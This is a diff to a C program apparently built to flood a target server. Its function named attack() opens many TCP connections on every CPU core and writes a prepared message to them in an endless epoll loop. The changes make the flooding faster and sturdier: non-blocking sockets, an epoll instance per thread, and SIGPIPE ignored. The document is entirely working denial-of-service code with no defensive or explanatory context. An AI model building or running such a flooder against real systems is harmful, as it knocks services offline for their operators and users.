@@ -9,10 +9,12 @@
 #include <assert.h>
 #include <err.h>
 #include <pthread.h>
+#include <signal.h>
+#include <fcntl.h>
+#include <errno.h>
 
 static const int nconns = 128;
 static long ncores;
-static int ep;
 
 static const char *msg;
 static size_t msglen;
@@ -40,14 +42,19 @@ static void *attack(void *arg) {
 	struct addrinfo *ai = arg;
 	const int nsocks = nconns / ncores;
 	struct sockdata sdata[nsocks];
+	int ep = epoll_create1(0);
+	assert(ep != -1);
 
 	for (int i = 0; i < nsocks; ++i) {
 		int sock = socket(AF_INET, SOCK_STREAM, 0);
+		int flags = fcntl(sock, F_GETFL) | O_NONBLOCK;
+		fcntl(sock, F_SETFL, flags);
+		
 		assert(sock != -1);
 		int ret = connect(sock, ai->ai_addr,
 				sizeof(struct sockaddr_in));
-		printf("Connected!\n");
-		assert(ret == 0);
+		assert(ret == 0 || errno == EINPROGRESS);
+
 		sdata[i] = (struct sockdata){ .sock = sock, .ind = 0 };
 
 		struct epoll_event ev = { .events = EPOLLOUT,
@@ -58,16 +65,17 @@ static void *attack(void *arg) {
 	}
 
 	struct epoll_event events[8];
+	
 	while (1) {
 		int nevents = epoll_wait(ep, events, 8, -1);
-
+		
 		for (int i = 0; i < nevents; ++i) {
 			struct sockdata *sd = events[i].data.ptr;
 			ssize_t writ = write(sd->sock,
 					     msg + sd->ind,
 					     msglen - sd->ind);
 			if (writ == -1) {
-				warn("Socket failed");
+				err(1, "Socket failed");
 			} else {
 				sd->ind += writ;
 				if (sd->ind == msglen) {
@@ -76,7 +84,6 @@ static void *attack(void *arg) {
 			}
 		}
 	}
-		
 }
 
 int main(int argc, char **argv) {
@@ -87,11 +94,9 @@ int main(int argc, char **argv) {
 	}
 
 	msg = prepmsg();
-	printf("output: %.*s", msglen, msg);
 	ncores = sysconf(_SC_NPROCESSORS_ONLN);
 
-	ep = epoll_create1(0);
-	assert(ep != -1);
+	signal(SIGPIPE, SIG_IGN);
 	
 	struct addrinfo *res, hint =
 		{ .ai_family = AF_INET,
